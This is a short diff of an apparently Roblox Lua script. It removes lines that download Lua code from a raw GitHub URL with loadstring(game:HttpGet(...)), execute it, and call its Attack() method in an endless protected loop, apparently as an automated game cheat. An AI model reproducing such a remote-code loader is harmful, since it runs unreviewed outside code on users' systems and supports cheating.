@@ -248,12 +248,3 @@ spawn(function()
         end
     end
 end)
-
-local Gaynicu = loadstring(game:HttpGet("https://raw.githubusercontent.com/Reisaga/DepZaiXemSecGoiAPhucSinh/refs/heads/main/Ditmehublon.lua"))()
-spawn(function()
-    while task.wait() do
-        pcall(function()
-            Gaynicu:Attack()
-        end)
-    end
-end)
